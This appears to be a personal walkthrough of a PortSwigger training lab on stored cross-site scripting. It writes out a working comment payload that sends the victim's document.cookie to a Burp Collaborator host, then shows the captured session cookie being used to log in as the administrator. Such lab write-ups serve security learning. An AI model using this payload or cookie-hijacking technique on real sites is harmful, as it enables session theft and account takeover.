# Lab - Exploiting cross-site scripting to steal cookies

## Objective:  This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim. 

I went to the comments section and I tried out the `<script>alert(2)<\script> payload.`

This payload did not work. 

 I went to the portswigger XSS cheat cheat and tried the following payload
 
 ![[Pasted image 20210911141429.png]]
 
 ![[Pasted image 20210911141512.png]]
 
 After entering the payload, an alert box displays. This means the stored XSS worked.
 
 ![[Pasted image 20210911141550.png]]
 
 The next step is to change the payload to steal the user's cookie. Since this is a stored XSS attack, any user who visits this page will execute the javascript. 
 
 
I went back to the cheatsheat and this payload looks promising

![[Pasted image 20210911141739.png]]

`<video><source onerror=location=/\02.rs/+document.cookie>`
	
I would need to change the location to my malicious server listening for the cookies. This lab will only send outbound requests to burpcollaborator.net which is used by Burp Pro. I was able to get a trial version 

From Burp Pro, I went to Burp > Burp Collaborator client

![[Pasted image 20210911143751.png]]

I clicked "Copy to clipboard" to get the burp.collaborator.net FQDN

2nqn3xw3l8edc2y6w5wia7k7pyvpje.burpcollaborator.net

![[Pasted image 20210911143938.png]]

Now, in the XSS payload, I will use this FQDN 

`<video><source onerror=location=/\2nqn3xw3l8edc2y6w5wia7k7pyvpje.burpcollaborator.net/+document.cookie>`
	
![[Pasted image 20210911144041.png]]
	
I received the following error

![[Pasted image 20210911144134.png]]

I dropped the payload from the Name field because it was too long.

![[Pasted image 20210911144202.png]]

![[Pasted image 20210911144220.png]]

From the Collaborator client, I can see an HTTP request for `/secret=n0mdFU8w7BsSFNVOtkMIiUDjTmNsvDHQ;%20session=gimJNMnGHeTwVAkPn4GAIa0ga8s2LjxD`

![[Pasted image 20210911145838.png]]

This is probably the cookie for another user. I took it an replaced my own cookie with `gimJNMnGHeTwVAkPn4GAIa0ga8s2LjxD`

![[Pasted image 20210911150023.png]]

After replacing my cookie, I passed the lab!

![[Pasted image 20210911150042.png]]

I clicked to "My account" and I can see that the cookie I used was the Administrator user.

![[Pasted image 20210911150123.png]]